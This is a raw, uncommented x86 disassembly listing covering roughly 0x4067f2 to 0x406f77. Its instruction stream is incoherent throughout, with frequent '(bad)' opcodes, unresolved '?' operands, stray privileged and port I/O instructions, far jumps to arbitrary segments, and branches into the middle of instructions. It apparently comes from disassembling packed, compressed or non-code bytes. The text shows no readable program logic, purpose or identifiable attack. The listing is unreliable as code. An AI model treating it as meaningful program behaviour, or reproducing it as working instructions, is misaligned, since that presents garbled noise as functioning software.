  4067f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067f3:	push   edi
  4067f4:	pop    esp
  4067f5:	icebp  
  4067f6:	es cli 
  4067f8:	mov    eax,ds:0x78dad86a
  4067fd:	mov    al,BYTE PTR [eax+0x30]
  406800:	mov    ecx,0xda823aaf
  406805:	loopne 0x4067ae
  406807:	std    
  406808:	ss pop ebx
  40680a:	inc    ecx
  40680b:	div    DWORD PTR [ecx-0x23e81c79]
  406811:	jb     0x406809
  406813:	jnp    0x40683b
  406815:	clc    
  406816:	imul   esi,DWORD PTR [ebx+0x1cad5b2f],0x7f
  40681d:	ss popf 
  40681f:	cld    
  406820:	inc    eax
  406821:	mov    dh,0xd5
  406823:	add    ebx,0xffffffea
  406826:	sahf   
  406827:	xchg   edi,eax
  406828:	(bad)  
  406829:	mov    ch,0x3e
  40682b:	ret    
  40682c:	inc    BYTE PTR [ecx]
  40682e:	in     eax,0x57
  406830:	pushf  
  406831:	cmp    edi,DWORD PTR [ebx]
  406833:	push   edi
  406834:	dec    ecx
  406835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406836:	enter  0x6afe,0xc
  40683a:	aad    0xdb
  40683c:	jns    0x4067e4
  40683e:	sbb    BYTE PTR [edx],dl
  406840:	test   eax,0x42b0799
  406845:	mov    al,0x90
  406847:	outs   dx,BYTE PTR ds:[esi]
  406848:	mov    WORD PTR [ecx+ebx*2+0x77b68e18],ds
  40684f:	icebp  
  406850:	shr    BYTE PTR [edx+0x4b634306],0x12
  406857:	or     eax,0xb6c8e747
  40685c:	cdq    
  40685d:	pop    esp
  40685e:	add    BYTE PTR [edi],bh
  406860:	cmp    ebx,edx
  406862:	mov    edx,0x261bca46
  406867:	je     0x4067ea
  406869:	(bad)  
  40686b:	adc    al,ah
  40686d:	retf   0x19b3
  406870:	js     0x406845
  406872:	push   ecx
  406873:	sub    BYTE PTR [esi+edi*8-0x37],bl
  406877:	jmp    0x406860
  406879:	pop    ebx
  40687a:	pop    edx
  40687b:	mov    ecx,0xcea1f4b3
  406880:	jbe    0x406806
  406882:	sti    
  406883:	pop    esi
  406884:	mov    bh,0xd7
  406886:	cmp    DWORD PTR [esi+0x7c],0xffffffbd
  40688a:	adc    DWORD PTR [ebx],ecx
  40688c:	xor    BYTE PTR cs:[edx+0xcb8acee],bh
  406893:	scas   eax,DWORD PTR es:[edi]
  406894:	ja     0x40685e
  406896:	imul   ecx,DWORD PTR [ebx+0x13b04bf6],0xffffffd2
  40689d:	les    ebp,FWORD PTR [ecx-0x795a8332]
  4068a3:	jmp    DWORD PTR [ebx+0x16]
  4068a6:	gs cwde 
  4068a8:	push   edi
  4068a9:	xchg   BYTE PTR [esi+eax*4],ah
  4068ac:	leave  
  4068ad:	(bad)  
  4068ae:	add    BYTE PTR [edx-0x2f],bh
  4068b1:	pop    ss
  4068b2:	add    eax,0xb49268b
  4068b7:	fnstcw WORD PTR [edx-0x1]
  4068ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068bb:	xlat   BYTE PTR ds:[ebx]
  4068bc:	bnd jns 0x406896
  4068bf:	jecxz  0x4068e8
  4068c1:	cli    
  4068c2:	gs ins BYTE PTR es:[edi],dx
  4068c4:	loopne 0x406924
  4068c6:	(bad)  
  4068c7:	sbb    DWORD PTR [edi],esp
  4068c9:	jecxz  0x4068e9
  4068cb:	jno    0x406897
  4068cd:	and    dh,BYTE PTR [ebx]
  4068cf:	ins    BYTE PTR es:[edi],dx
  4068d0:	mov    ?,esp
  4068d2:	jae    0x406926
  4068d4:	retf   0xa6c8
  4068d7:	(bad)  
  4068d8:	ins    DWORD PTR es:[edi],dx
  4068d9:	inc    esp
  4068da:	push   ecx
  4068db:	adc    eax,0x5a53487c
  4068e0:	pop    edi
  4068e1:	jle    0x4068b2
  4068e3:	lea    edx,[esi+0x44]
  4068e6:	push   esi
  4068e7:	dec    ebp
  4068e8:	in     al,0xf
  4068ea:	push   ss
  4068eb:	retf   
  4068ec:	sub    BYTE PTR [ebp+esi*1+0x65],ch
  4068f0:	cwde   
  4068f1:	add    edi,ebx
  4068f3:	sahf   
  4068f4:	push   ds
  4068f5:	hlt    
  4068f6:	pop    edx
  4068f7:	inc    eax
  4068f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068f9:	mov    DWORD PTR [esi-0x6fcdc04c],ebx
  4068ff:	dec    ebp
  406900:	shr    BYTE PTR [ecx+0x36ccb878],0xc5
  406907:	(bad)  
  406908:	mov    al,ds:0xf79f03ea
  40690d:	sub    DWORD PTR [eax],edx
  40690f:	dec    edi
  406910:	jmp    0x4068a5
  406912:	clc    
  406913:	mov    edi,0x2dc57aef
  406918:	nop
  406919:	xor    esp,eax
  40691b:	popa   
  40691c:	loop   0x4068a4
  40691e:	xchg   esp,eax
  40691f:	or     al,BYTE PTR [edx+0x42]
  406922:	retf   
  406923:	rol    DWORD PTR [eax+0x6cfc1701],cl
  406929:	lea    eax,[esi-0x615d6d6b]
  40692f:	out    dx,al
  406930:	out    0xe,eax
  406932:	cmp    dh,dh
  406934:	xchg   DWORD PTR [ecx],ebx
  406936:	dec    esp
  406937:	adc    ah,dl
  406939:	bound  edi,QWORD PTR [edi]
  40693b:	shl    BYTE PTR [eax-0x39d8f35a],0xaf
  406942:	add    al,BYTE PTR [ecx+0x15]
  406945:	fdiv   DWORD PTR ds:0x622336bd
  40694b:	mov    ah,0xeb
  40694d:	push   edx
  40694e:	call   0xb66a175f
  406953:	rcr    DWORD PTR [ecx],0x44
  406956:	sti    
  406957:	fisubr DWORD PTR [edi-0x34]
  40695a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40695b:	(bad)  
  40695c:	daa    
  40695d:	mov    bh,BYTE PTR [ecx+0x4a]
  406960:	mov    al,bh
  406962:	adc    esi,DWORD PTR [eax-0x8]
  406965:	out    dx,al
  406966:	mov    esi,edx
  406968:	std    
  406969:	int3   
  40696a:	dec    edi
  40696b:	fwait
  40696c:	xchg   esp,eax
  40696d:	ret    0x1b57
  406970:	je     0x40697e
  406972:	and    DWORD PTR [esi+0x43],esp
  406975:	loope  0x4069a5
  406977:	mov    BYTE PTR [edi],bh
  406979:	fs popf 
  40697b:	fdiv   DWORD PTR [ebx+0x365a7132]
  406981:	stos   BYTE PTR es:[edi],al
  406982:	popf   
  406983:	cwde   
  406984:	pusha  
  406985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406986:	test   DWORD PTR ds:0xd7a69226,esi
  40698c:	sahf   
  40698d:	sub    DWORD PTR [ebx+edx*8],0x60
  406991:	push   es
  406992:	std    
  406993:	mov    esp,gs
  406995:	fsub   QWORD PTR [ebx+0x660e8742]
  40699b:	and    esp,edi
  40699d:	cmp    BYTE PTR [ebp+0x57a27bc8],0x87
  4069a4:	inc    ebp
  4069a5:	pop    edx
  4069a6:	pop    ss
  4069a7:	mov    esi,DWORD PTR [ebx+0x3e7c53a6]
  4069ad:	ficom  DWORD PTR [ecx-0x21]
  4069b0:	jge    0x4069b7
  4069b2:	inc    eax
  4069b3:	xchg   ecx,eax
  4069b4:	xor    eax,0x7dbe7bd9
  4069b9:	std    
  4069ba:	cs or  al,0xf2
  4069bd:	jne    0x40694f
  4069bf:	fidivr DWORD PTR [esi+esi*2]
  4069c2:	or     ah,dh
  4069c4:	xchg   ebx,eax
  4069c5:	pushf  
  4069c6:	jmp    0x4069b9
  4069c8:	lea    esp,[ebx+0xc]
  4069cb:	into   
  4069cc:	adc    ebx,DWORD PTR [ebx-0x308f374e]
  4069d2:	add    al,0x74
  4069d4:	ins    BYTE PTR es:[edi],dx
  4069d5:	xchg   DWORD PTR [edx+edx*2-0x6],esi
  4069d9:	(bad)  
  4069db:	ret    0x1efd
  4069de:	jns    0x4069fc
  4069e0:	push   esi
  4069e1:	adc    BYTE PTR [ebx-0x56],dl
  4069e4:	adc    BYTE PTR ds:0xf7d113ff,dh
  4069ea:	and    BYTE PTR [edi],ah
  4069ec:	or     al,0xb1
  4069ee:	jle    0x406a5b
  4069f0:	or     eax,0x7102c12d
  4069f5:	iret   
  4069f6:	dec    ebp
  4069f7:	xlat   BYTE PTR ds:[ebx]
  4069f8:	and    ebp,DWORD PTR [ebp-0x68e7b2a]
  4069fe:	dec    esi
  4069ff:	mov    al,BYTE PTR [ebp-0x583b0c3]
  406a05:	push   edi
  406a06:	arpl   ax,dx
  406a08:	push   DWORD PTR [ecx+0x46]
  406a0b:	mov    cl,al
  406a0d:	sub    DWORD PTR [ecx],esp
  406a0f:	add    DWORD PTR [eax+ecx*8-0x5f],ebx
  406a13:	mov    ebp,0x7cc5138b
  406a18:	dec    ebp
  406a19:	push   esi
  406a1a:	xchg   ecx,eax
  406a1b:	xchg   edx,eax
  406a1c:	pop    ecx
  406a1d:	pusha  
  406a1e:	mov    ch,0x68
  406a20:	dec    eax
  406a21:	cmp    dl,bh
  406a23:	out    0x9,eax
  406a25:	mov    dh,0xcc
  406a27:	call   0x2005385f
  406a2c:	leave  
  406a2d:	popa   
  406a2e:	cli    
  406a2f:	dec    edi
  406a30:	cmp    eax,0xfd5385e
  406a35:	and    esi,DWORD PTR [eax]
  406a37:	xlat   BYTE PTR ds:[ebx]
  406a38:	gs test al,0xab
  406a3b:	aam    0x96
  406a3d:	ds aad 0xcb
  406a40:	and    ecx,DWORD PTR [ecx]
  406a42:	mov    ecx,0xad910d45
  406a47:	jns    0x406a5e
  406a49:	mov    al,ds:0x9f92e700
  406a4e:	mov    esp,0x88d0e02e
  406a53:	xor    BYTE PTR [edi-0x72],cl
  406a56:	cs aam 0xa6
  406a59:	mov    ebx,?
  406a5b:	inc    edi
  406a5c:	mov    edi,0x7a9cca73
  406a61:	xchg   edx,eax
  406a62:	dec    esp
  406a63:	adc    cl,BYTE PTR [eax+0x2f505554]
  406a69:	pop    edx
  406a6a:	and    DWORD PTR [edi-0xa],ecx
  406a6d:	hlt    
  406a6e:	(bad)  
  406a6f:	or     DWORD PTR [edi],esp
  406a71:	in     al,0x99
  406a73:	faddp  st(7),st
  406a75:	mov    edi,0xd6b6cd49
  406a7a:	xchg   edx,eax
  406a7b:	pop    esi
  406a7c:	cmp    eax,0x6dbda556
  406a81:	xchg   edi,eax
  406a82:	cmp    BYTE PTR [esi],bl
  406a84:	mov    WORD PTR [eax],es
  406a86:	repnz mov dh,0xe5
  406a89:	lods   eax,DWORD PTR ds:[esi]
  406a8a:	cli    
  406a8b:	fistp  QWORD PTR [edi-0x457a56ba]
  406a91:	dec    ebp
  406a92:	push   0x73ecc056
  406a97:	lahf   
  406a98:	retf   
  406a99:	fst    QWORD PTR [eax+0x59]
  406a9c:	out    0xcb,al
  406a9e:	mov    ch,BYTE PTR [ecx+0x4c]
  406aa1:	out    dx,al
  406aa2:	sbb    al,0xde
  406aa4:	jecxz  0x406ae0
  406aa6:	mov    eax,ds:0xafe45e2e
  406aab:	mov    esi,0xdf87dc01
  406ab0:	icebp  
  406ab1:	xchg   ebx,eax
  406ab2:	adc    esp,edi
  406ab4:	mov    ah,0xd5
  406ab6:	aas    
  406ab7:	mov    ah,0x28
  406ab9:	inc    ebp
  406aba:	(bad)  
  406abb:	sar    DWORD PTR [ecx+0x68],0xbb
  406abf:	and    ah,BYTE PTR [edx+ebx*2]
  406ac2:	inc    esi
  406ac3:	jno    0x406a5e
  406ac5:	out    dx,al
  406ac6:	retf   
  406ac7:	fs cmc 
  406ac9:	dec    esp
  406aca:	out    dx,al
  406acb:	(bad)  
  406acc:	cmp    DWORD PTR [edx-0xb],esp
  406acf:	push   ds
  406ad0:	jmp    0x406abe
  406ad2:	cs ret 
  406ad4:	inc    edx
  406ad5:	xlat   BYTE PTR ds:[ebx]
  406ad6:	and    eax,0x4715a0ba
  406adb:	jle    0x406a78
  406add:	das    
  406ade:	mov    dh,BYTE PTR [esi]
  406ae0:	daa    
  406ae1:	jne    0x406acb
  406ae3:	mov    ah,0x5f
  406ae5:	jmp    0x406ab9
  406ae7:	dec    ecx
  406ae8:	push   cs
  406ae9:	pushf  
  406aea:	mov    ds:0xe4bb2edf,eax
  406aef:	rol    BYTE PTR [esi+0x64],cl
  406af2:	stc    
  406af3:	sbb    BYTE PTR [esi],ah
  406af5:	adc    al,0x62
  406af7:	je     0x406b25
  406af9:	mov    ch,0xb3
  406afb:	cli    
  406afc:	stos   DWORD PTR es:[edi],eax
  406afd:	pop    ecx
  406afe:	cwde   
  406aff:	fdiv   QWORD PTR [esi+0x4c9d8613]
  406b05:	je     0x406aba
  406b07:	pusha  
  406b08:	aas    
  406b09:	(bad)  
  406b0a:	jns    0x406b85
  406b0c:	and    al,0x65
  406b0e:	adc    BYTE PTR [edi-0x91d1013],cl
  406b14:	xor    eax,DWORD PTR [ebp+0x739d0c8f]
  406b1a:	xchg   edi,eax
  406b1b:	(bad)  
  406b1c:	fldln2 
  406b1e:	in     eax,0x62
  406b20:	xchg   DWORD PTR [ebx+0x6558dfe6],esp
  406b26:	sbb    ch,ah
  406b28:	pop    ss
  406b29:	mov    esi,0xd7781071
  406b2e:	inc    ebp
  406b2f:	sbb    BYTE PTR [ebp-0x72],bh
  406b32:	inc    ebp
  406b33:	cld    
  406b34:	jno    0x406bab
  406b36:	xor    al,0x10
  406b38:	jmp    0x27538ce4
  406b3d:	jo     0x406b10
  406b3f:	mov    BYTE PTR [ebx+0x65],dh
  406b42:	lahf   
  406b43:	jno    0x406b4c
  406b45:	mov    bh,BYTE PTR [eax+0x34]
  406b48:	sub    BYTE PTR [edi-0x7b6fb797],bh
  406b4e:	arpl   WORD PTR [edx+0x6b],cx
  406b51:	xor    BYTE PTR ss:[edi],al
  406b54:	and    al,0xa4
  406b56:	xor    eax,0x2858f2c6
  406b5b:	iret   
  406b5c:	mov    edi,ebx
  406b5e:	or     edi,DWORD PTR [ebx+edi*2-0x2e]
  406b62:	jae    0x406bb1
  406b64:	mov    dh,0x64
  406b66:	outs   dx,BYTE PTR ds:[esi]
  406b67:	aam    0xc
  406b69:	shl    BYTE PTR [esi+0x4d],0xfd
  406b6d:	xchg   BYTE PTR [eax+0x3],bl
  406b70:	(bad)  
  406b72:	rcr    ah,0x84
  406b75:	in     eax,0x3d
  406b77:	mov    esp,0x2fd3cac4
  406b7c:	aad    0x48
  406b7e:	cwde   
  406b7f:	pusha  
  406b80:	jno    0x406b25
  406b82:	std    
  406b83:	sub    al,0x8c
  406b85:	popa   
  406b86:	(bad)  
  406b88:	push   esi
  406b89:	jge    0x406bba
  406b8b:	adc    ecx,0x4e
  406b8e:	mov    ds:0xf12b4f25,eax
  406b93:	and    eax,0xe40976ea
  406b98:	(bad)  
  406b99:	push   edi
  406b9a:	int    0x9
  406b9c:	clc    
  406b9d:	inc    ebp
  406b9e:	dec    esp
  406b9f:	stos   DWORD PTR es:[edi],eax
  406ba0:	les    eax,FWORD PTR [esi-0x55cb5286]
  406ba6:	adc    DWORD PTR [ecx-0x72],eax
  406ba9:	jne    0x406bd0
  406bab:	stos   BYTE PTR es:[edi],al
  406bac:	into   
  406bad:	sub    DWORD PTR [ebx],0xffffff9c
  406bb0:	cmp    eax,0x5753c98f
  406bb5:	ret    0xa149
  406bb8:	sub    ch,bl
  406bba:	in     al,dx
  406bbb:	add    edi,edi
  406bbd:	xchg   ebp,eax
  406bbe:	cs daa 
  406bc0:	jg     0x406bbe
  406bc2:	jecxz  0x406b8f
  406bc4:	cli    
  406bc5:	fdivr  st,st(2)
  406bc7:	sbb    DWORD PTR [esi+0x3c20392f],esi
  406bcd:	test   eax,0x5dff798b
  406bd2:	inc    ebx
  406bd3:	or     ecx,ebp
  406bd5:	jno    0x406b57
  406bd7:	retf   
  406bd8:	mov    ebx,0x2847a3ee
  406bdd:	and    cl,BYTE PTR [eax]
  406bdf:	into   
  406be0:	ss sahf 
  406be2:	shr    edx,cl
  406be4:	cmp    BYTE PTR [ecx-0x7b],ah
  406be7:	pop    ds
  406be8:	mov    ds:0x8b084b40,al
  406bed:	sbb    DWORD PTR [ebx],0x3e65613f
  406bf3:	shl    DWORD PTR [ebx+ebx*1-0x743bafc5],0xcf
  406bfb:	dec    edx
  406bfc:	out    0x39,al
  406bfe:	or     DWORD PTR [edi],ebp
  406c00:	call   0xac8bdecc
  406c05:	and    BYTE PTR [ebx+0x6],dh
  406c08:	rol    eax,0x2
  406c0b:	daa    
  406c0c:	int    0xdb
  406c0e:	mov    ds:0xb80d41bc,eax
  406c13:	pop    ds
  406c14:	push   ebx
  406c15:	jle    0x406bad
  406c17:	xchg   edx,eax
  406c18:	enter  0x7a6d,0x25
  406c1c:	adc    ecx,ebx
  406c1e:	mov    edx,0xa4818923
  406c23:	mov    dh,0xb4
  406c25:	push   ss
  406c26:	sub    BYTE PTR [edx],bl
  406c28:	fld    TBYTE PTR [esi-0x34]
  406c2b:	lods   eax,DWORD PTR ds:[esi]
  406c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c2d:	pop    ebx
  406c2e:	scas   eax,DWORD PTR es:[edi]
  406c2f:	aad    0xdf
  406c31:	push   esi
  406c32:	cld    
  406c33:	in     eax,0x13
  406c35:	lock imul edx,esp,0xffffffd7
  406c39:	inc    edi
  406c3a:	mov    ah,0x98
  406c3c:	fmul   QWORD PTR [edx+0x4f90c86a]
  406c42:	push   ecx
  406c43:	mov    edx,0xb8e04c88
  406c48:	jg     0x406c42
  406c4a:	xchg   esp,eax
  406c4b:	or     eax,0x51ab3f82
  406c50:	loop   0x406cad
  406c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c53:	adc    BYTE PTR [edi-0x77],dl
  406c56:	mov    esp,0x4d8f36e
  406c5b:	cmp    DWORD PTR fs:[esi+0x1b],ebx
  406c5f:	mov    dh,0xa3
  406c61:	dec    edi
  406c62:	sar    ch,cl
  406c64:	cmp    ecx,edi
  406c66:	lods   al,BYTE PTR ds:[esi]
  406c67:	dec    esp
  406c68:	cwde   
  406c69:	icebp  
  406c6a:	and    BYTE PTR [eax+ebp*1-0x885c829],bl
  406c71:	mov    dl,0xc8
  406c73:	enter  0x4d8a,0x47
  406c77:	jb     0x406c0a
  406c79:	cs aas 
  406c7b:	(bad)  [edx-0x17fb5ce]
  406c81:	retf   0xd96b
  406c84:	into   
  406c85:	push   0xe9bd9d3a
  406c8a:	call   0x28d35abf
  406c8f:	aaa    
  406c90:	jg     0x406c4a
  406c92:	jge    0x406d08
  406c94:	div    BYTE PTR [edi-0x61f287aa]
  406c9a:	sub    edx,ebp
  406c9c:	dec    ebp
  406c9d:	fwait
  406c9e:	ins    BYTE PTR es:[edi],dx
  406c9f:	out    0xd9,al
  406ca1:	fnstenv [ebx+0x1f]
  406ca4:	sub    DWORD PTR [esi+0x1c],0xbf04efaa
  406cab:	je     0x406c7a
  406cad:	push   ecx
  406cae:	fwait
  406caf:	arpl   WORD PTR [edx+0x22],dx
  406cb2:	ss call 0xf06d1d32
  406cb8:	xchg   esp,eax
  406cb9:	cmp    edx,esi
  406cbb:	sub    DWORD PTR [esi+0x23],edi
  406cbe:	and    BYTE PTR [edi+ebx*8+0x561432d3],ah
  406cc5:	stc    
  406cc6:	test   al,0x29
  406cc8:	(bad)  
  406cc9:	ins    DWORD PTR es:[edi],dx
  406cca:	or     edx,DWORD PTR [eax+0x64]
  406ccd:	sub    dh,0x19
  406cd0:	cld    
  406cd1:	cmp    al,0xec
  406cd3:	or     dl,0xdf
  406cd6:	inc    ebp
  406cd7:	cmp    al,0xb
  406cd9:	ja     0x406d4f
  406cdb:	pop    esi
  406cdc:	sub    al,0xaf
  406cde:	repnz mov ?,WORD PTR [ebp+0x3bb2df]
  406ce5:	int3   
  406ce6:	ja     0x406c72
  406ce8:	sti    
  406ce9:	mov    bh,0x30
  406ceb:	jns    0x406d67
  406ced:	ins    BYTE PTR es:[edi],dx
  406cee:	mov    ds,WORD PTR [bx+di-0x1318]
  406cf3:	add    BYTE PTR ds:0x43148f16,cl
  406cf9:	push   ebp
  406cfa:	std    
  406cfb:	aad    0x2c
  406cfd:	dec    ecx
  406cfe:	adc    al,0x29
  406d00:	and    al,0xec
  406d02:	scas   eax,DWORD PTR es:[edi]
  406d03:	call   0x8ea9:0xdbf9a0c6
  406d0a:	fs leave 
  406d0c:	and    eax,0x257c82ac
  406d11:	push   ecx
  406d12:	aad    0x34
  406d14:	jb     0x406cf5
  406d16:	ds iret 
  406d18:	(bad)  
  406d19:	lea    esp,[eax+0x344a57ee]
  406d1f:	and    esi,DWORD PTR [eax-0x34775a02]
  406d25:	push   0xe6f8b215
  406d2a:	cs ins BYTE PTR es:[edi],dx
  406d2c:	shl    DWORD PTR [esi-0x5e],0x83
  406d30:	xor    eax,0xffffffa5
  406d33:	jmp    FWORD PTR [edi]
  406d35:	push   ebp
  406d36:	xchg   ebp,eax
  406d37:	test   al,0xa8
  406d39:	adc    esi,edi
  406d3b:	repnz and ecx,DWORD PTR [edx-0x57]
  406d3f:	inc    ecx
  406d40:	mov    ebp,0x7d107d38
  406d45:	outs   dx,BYTE PTR ds:[esi]
  406d46:	mov    WORD PTR [ebp+0x6add0f91],ds
  406d4c:	sbb    DWORD PTR [ecx+0xb7cbc3f],esp
  406d52:	je     0x406dac
  406d54:	adc    cl,BYTE PTR [edx-0x151eaff9]
  406d5a:	inc    esp
  406d5b:	inc    ebx
  406d5c:	push   es
  406d5d:	sub    eax,0xba4fee62
  406d62:	scas   eax,DWORD PTR es:[edi]
  406d63:	jle    0x406ddc
  406d65:	and    ch,bl
  406d67:	lahf   
  406d68:	lods   al,BYTE PTR ds:[esi]
  406d69:	arpl   si,bx
  406d6b:	pop    ebx
  406d6c:	sub    eax,0x1eb920d1
  406d71:	or     al,0x64
  406d73:	cmp    bl,BYTE PTR [edx]
  406d75:	ins    BYTE PTR es:[edi],dx
  406d76:	js     0x406d8a
  406d78:	dec    ebp
  406d79:	repnz fdiv st(7),st
  406d7c:	jne    0x406d6c
  406d7e:	inc    edx
  406d7f:	test   eax,0xfd342483
  406d84:	add    ebx,DWORD PTR [ecx-0x17]
  406d87:	adc    bl,al
  406d89:	adc    BYTE PTR [ebp-0x11e53a2d],cl
  406d8f:	fist   WORD PTR [ebx+edi*4]
  406d92:	cmp    eax,0xf6f7373d
  406d97:	out    dx,al
  406d98:	xchg   esp,eax
  406d99:	(bad)  
  406d9b:	inc    edx
  406d9c:	dec    ebx
  406d9d:	mov    ebx,0xc80807c4
  406da2:	or     esp,0xe3d07696
  406da8:	stos   DWORD PTR es:[di],eax
  406daa:	jmp    0x4534:0x65785b3f
  406db1:	inc    eax
  406db2:	outs   dx,BYTE PTR ds:[esi]
  406db3:	dec    edx
  406db4:	mov    esi,0xfaa66cd8
  406db9:	int    0xb3
  406dbb:	test   al,0xfc
  406dbd:	jecxz  0x406d5c
  406dbf:	das    
  406dc0:	dec    BYTE PTR [ebx-0x27866a33]
  406dc6:	mov    edi,0x1bf42ff7
  406dcb:	cdq    
  406dcc:	mov    bh,0x94
  406dce:	cmp    eax,DWORD PTR [edi+0x6bac7290]
  406dd4:	pop    edi
  406dd5:	xchg   DWORD PTR [ebp-0x4b],esp
  406dd8:	int    0x45
  406dda:	les    ecx,FWORD PTR [ebp-0x4a]
  406ddd:	mov    WORD PTR [edx+0x7b033d98],es
  406de3:	mov    WORD PTR [ebx],?
  406de5:	mov    ebx,0x688469be
  406dea:	sub    al,0x89
  406dec:	retf   0xc32f
  406def:	mov    ecx,DWORD PTR [ebx+ebp*2+0x43]
  406df3:	lea    eax,[eax+esi*1+0x2bb6c44f]
  406dfa:	in     al,0x76
  406dfc:	mov    ebx,0x9de11c3a
  406e01:	ins    DWORD PTR es:[edi],dx
  406e02:	jnp    0x406db5
  406e04:	ja     0x406daa
  406e06:	(bad)  
  406e08:	stos   DWORD PTR es:[edi],eax
  406e09:	mov    BYTE PTR [edi-0x4e23ed50],cl
  406e0f:	repnz mov bl,0x3
  406e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e13:	mov    WORD PTR [eax+0x1fb24504],es
  406e19:	sub    al,0xb2
  406e1b:	nop
  406e1c:	adc    DWORD PTR [eax+0x1838dcd],eax
  406e22:	lock in al,0xc2
  406e25:	push   esp
  406e26:	scas   al,BYTE PTR es:[edi]
  406e27:	pop    esp
  406e28:	dec    ebx
  406e29:	sbb    eax,0xb82cfc32
  406e2e:	aaa    
  406e2f:	sub    edx,DWORD PTR [edi+0x11]
  406e32:	int    0xec
  406e34:	push   es
  406e35:	ror    cl,0xd7
  406e38:	pop    sp
  406e3a:	sbb    DWORD PTR [esi+0x32927c8b],edx
  406e40:	shr    BYTE PTR [eax],0xe8
  406e43:	xchg   ebx,eax
  406e44:	xchg   esp,eax
  406e45:	push   0xffffffc5
  406e47:	pop    ecx
  406e48:	cmp    al,0xd4
  406e4a:	or     eax,0xbe15fe2d
  406e4f:	repz sbb al,0xf8
  406e52:	sub    BYTE PTR [ebp+0x48eb150a],ah
  406e58:	sbb    BYTE PTR [ebp+0x50],0xe6
  406e5c:	sbb    BYTE PTR [esi],0xb9
  406e5f:	mov    WORD PTR [esi-0xec5e915],?
  406e65:	jno    0x406ec0
  406e67:	mov    esp,0x4ef7e96e
  406e6c:	inc    edx
  406e6d:	push   eax
  406e6e:	push   es
  406e6f:	push   edi
  406e70:	imul   ecx,DWORD PTR [ebx],0x6c
  406e73:	pop    ss
  406e74:	or     eax,0xf8202328
  406e79:	enter  0x78be,0xa8
  406e7d:	xchg   ebx,eax
  406e7e:	int    0xe0
  406e80:	dec    edx
  406e81:	test   eax,0x5e79b0ff
  406e86:	pop    edx
  406e87:	push   0xffffff87
  406e89:	sbb    DWORD PTR [ebp-0x45],eax
  406e8c:	mov    ah,0xc
  406e8e:	adc    ch,BYTE PTR [ecx+0x32579a66]
  406e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e96:	cmp    esi,0x30
  406e99:	sti    
  406e9a:	lock pop ebx
  406e9c:	rcr    eax,cl
  406e9e:	add    DWORD PTR [ebx],ebp
  406ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea1:	mov    al,ds:0x47c25128
  406ea6:	(bad)  
  406ea7:	fdiv   QWORD PTR [ecx-0x3f]
  406eaa:	cmp    cl,BYTE PTR [ecx+0x3a2bf077]
  406eb0:	push   ebp
  406eb1:	(bad)  
  406eb2:	iret   
  406eb3:	(bad)  
  406eb4:	mov    bh,0xd8
  406eb6:	test   DWORD PTR [eax],edi
  406eb8:	and    DWORD PTR [ecx-0x2b07bf35],esp
  406ebe:	(bad)  
  406ebf:	sbb    dl,BYTE PTR [edx+0x77]
  406ec2:	(bad)  
  406ec3:	out    0xc1,eax
  406ec5:	sbb    bh,cl
  406ec7:	test   BYTE PTR [eax+eiz*1+0x1f],cl
  406ecb:	outs   dx,DWORD PTR ds:[esi]
  406ecc:	hlt    
  406ecd:	jno    0x406eea
  406ecf:	mov    WORD PTR [edx],?
  406ed1:	dec    edx
  406ed2:	jp     0x406f10
  406ed4:	push   0x303ae476
  406ed9:	jecxz  0x406e70
  406edb:	(bad)  
  406edc:	out    dx,eax
  406edd:	pop    ds
  406ede:	mov    ebx,0x70266222
  406ee3:	outs   dx,BYTE PTR ds:[esi]
  406ee4:	ins    DWORD PTR es:[edi],dx
  406ee5:	test   BYTE PTR [ebx],cl
  406ee7:	xchg   esp,eax
  406ee8:	pop    edx
  406ee9:	test   BYTE PTR [ebx-0x13890570],ch
  406eef:	es out 0xdf,al
  406ef2:	mov    edi,0x8630b9c4
  406ef7:	xchg   esi,eax
  406ef8:	push   ss
  406ef9:	xchg   esp,eax
  406efa:	retf   
  406efb:	add    BYTE PTR [edx],dh
  406efd:	mov    BYTE PTR [edx+ebp*1+0x6e],cl
  406f01:	mov    BYTE PTR [esi],bl
  406f03:	ja     0x406f1b
  406f05:	fwait
  406f06:	sbb    ch,BYTE PTR [ecx+0x71]
  406f09:	mov    ebp,0xfc82d386
  406f0e:	leave  
  406f0f:	ja     0x406edc
  406f11:	mov    edx,0x9f08f235
  406f16:	ret    
  406f17:	in     al,0xad
  406f19:	push   cs
  406f1a:	dec    edi
  406f1b:	sti    
  406f1c:	es ret 
  406f1e:	int    0x6b
  406f20:	lahf   
  406f21:	inc    edx
  406f22:	rcr    DWORD PTR [edi],1
  406f24:	ja     0x406f4e
  406f26:	mov    esp,0x1a5ac2f2
  406f2b:	xor    DWORD PTR [edx-0x24bfb79],ebp
  406f31:	in     eax,0xd4
  406f33:	inc    edx
  406f34:	xlat   BYTE PTR ds:[ebx]
  406f35:	enter  0xdb21,0xa3
  406f39:	and    dh,BYTE PTR [eax+ebp*2-0x7d]
  406f3d:	ret    0x6902
  406f40:	adc    DWORD PTR [ebp-0x31],edi
  406f43:	jg     0x406f78
  406f45:	cmc    
  406f46:	sahf   
  406f47:	jne    0x406eea
  406f49:	sar    DWORD PTR [ecx],1
  406f4b:	jp     0x406f69
  406f4d:	jp     0x406fce
  406f4f:	cs stc 
  406f51:	pop    esp
  406f52:	test   DWORD PTR [eax-0x80],edi
  406f55:	(bad)  
  406f56:	jb     0x406f2f
  406f58:	sbb    al,0x2e
  406f5a:	jl     0x406fd4
  406f5c:	jb     0x406f7c
  406f5e:	shl    BYTE PTR gs:[edx],0xfa
  406f62:	cmp    al,0x9
  406f64:	nop
  406f65:	add    eax,0x4e5a8fbf
  406f6a:	and    BYTE PTR [bx-0x58ab],al
  406f6f:	ret    0x8ea6
  406f72:	xchg   ecx,eax
  406f73:	mov    WORD PTR [esi-0x29],?
  406f76:	fwait
  406f77:	lods   al,BYTE PTR ds:[esi]
